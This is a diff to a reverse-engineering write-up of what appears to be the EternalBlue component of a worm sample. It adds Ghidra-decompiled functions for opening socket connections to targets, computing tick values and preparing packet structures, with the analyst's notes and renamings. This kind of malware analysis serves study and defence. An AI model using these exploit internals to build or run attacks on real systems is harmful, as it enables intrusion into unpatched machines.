@@ -9819,7 +9819,7 @@ int FUN_1000668a(undefined4 param_1,undefined4 param_2,undefined4 param_3,undefi
 }
 ```
 
-This function appears to call several functions with the data gathered so far. Given that we peek ahead and see that `FUN_10005a7e` is massive we first focus on the other two functions.
+This function appears to call several functions with the data gathered so far. Given that we peek ahead and see that `FUN_10005a7e` is massive we first focus on the other two functions. We will rename the function itself to `eternal_prep_and_cleanup`.
 
 ### FUN_10002068 (EternalBlue)
 
@@ -10287,13 +10287,106 @@ LAB_1000662d:
 
 Given the absurd number of out going references this is most likely the root function of EternalBlue and even worse is the fact that almost all the data is of an undefined type. We will rename the function to `eternal_blue_main`.
 
+The first thing to notice is that pretty much all the logic is in an infinite while loop. We start off with a call to `FUN_10006727`.
 
+### FUN_10006727 (EternalBlue)
 
+```cpp
+undefined4 FUN_10006727(int *param_1,char *param_2,undefined4 param_3){
+  byte bVar1;
+  int iVar2;
+  u_short uVar3;
+  SOCKET s;
+  byte *unaff_EBX;
+  uint local_1c;
+  ulong local_18;
+  undefined4 uStack20;
+  undefined4 uStack16;
+  u_long local_c [2];
+  
+  s = socket(2,1,6);
+  local_c[0] = 1;
+  ioctlsocket(s,-0x7ffb9982,local_c);
+  if ((s != 0xffffffff) && (bVar1 = *unaff_EBX, bVar1 < 0x20)) {
+    iVar2 = *param_1;
+    *unaff_EBX = bVar1 + 1;
+    *(SOCKET *)(iVar2 + (uint)bVar1 * 4) = s;
+    local_18 = 0;
+    uStack20 = 0;
+    uStack16 = 0;
+    local_1c = 2;
+    uVar3 = htons((u_short)param_3);
+    local_1c = local_1c & 0xffff | (uint)uVar3 << 0x10;
+    local_18 = inet_addr(param_2);
+    connect(s,(sockaddr *)&local_1c,0x10);
+    return 0;
+  }
+  return 0xffffffff;
+}
+```
 
+After adding custom storage for `EBX` this function clears up a bit, but the general purpose is clear, especially after also retyping `local_1c` to a `sockaddr`, a connection is opened to the address passed as `param_3` and `param_2`. We will rename the function to `eternal_open_connection`.
 
+### Back to eternal_blue_main
 
+The next function being called after opening a connection is `FUN_100020b2`.
 
+### FUN_100020b2 (EternalBlue)
 
+```cpp
+uint FUN_100020b2(void){
+  DWORD DVar1;
+  uint uVar2;
+  
+  DVar1 = GetTickCount();
+  uVar2 = DVar1 + 0x40 + _DAT_1001fb48 & 0xffff;
+  if ((short)uVar2 == 0) {
+    uVar2 = 0x40;
+  }
+  return uVar2;
+}
+```
+
+This function appears to get a tickcount some time into the future so we will rename the function `eternal_ticks_in_64`.
+
+### Back to eternal_blue_main
+
+After a few assignments using the ticks gotten to what are probably supposed to be structs we see a call to `FUN_10002ef5` with one such struct.
+
+### FUN_10002ef5 (EternalBlue)
+
+```cpp
+undefined4 FUN_10002ef5(undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4){
+  undefined4 in_EAX;
+  int iVar1;
+  undefined4 uVar2;
+  LPVOID pvVar3;
+  
+  iVar1 = FUN_1000270a(param_1,param_2,param_3,param_4);
+  if (iVar1 == 0) {
+    uVar2 = 0xffffffff;
+  }
+  else {
+    pvVar3 = allocate_memory(0x1000);
+    if (pvVar3 == (LPVOID)0x0) {
+      FUN_100020d0();
+      uVar2 = 0xffffffff;
+    }
+    else {
+      iVar1 = FUN_1000688f(iVar1);
+      if ((iVar1 == 0) && (iVar1 = FUN_1000243f(in_EAX,1), iVar1 == 0)) {
+        uVar2 = *(undefined4 *)((int)pvVar3 + 9);
+      }
+      else {
+        uVar2 = 0xffffffff;
+      }
+      FUN_100020d0();
+      FUN_100020d0();
+    }
+  }
+  return uVar2;
+}
+```
 
 
 
